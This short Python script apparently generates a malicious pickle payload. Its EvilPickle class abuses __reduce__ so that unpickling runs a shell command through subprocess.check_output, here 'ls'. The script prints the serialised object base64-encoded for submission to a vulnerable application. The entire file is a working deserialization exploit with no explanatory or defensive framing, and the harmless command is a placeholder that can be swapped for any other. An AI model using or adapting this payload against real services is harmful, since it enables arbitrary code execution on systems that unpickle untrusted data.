import pickle
import os
import base64
import subprocess
class EvilPickle(object): 
    def __reduce__(self): 
        return subprocess.check_output, (['ls'],)
pickle_data = pickle.dumps(EvilPickle())
pickle_data = base64.b64encode(pickle_data)
print(pickle_data)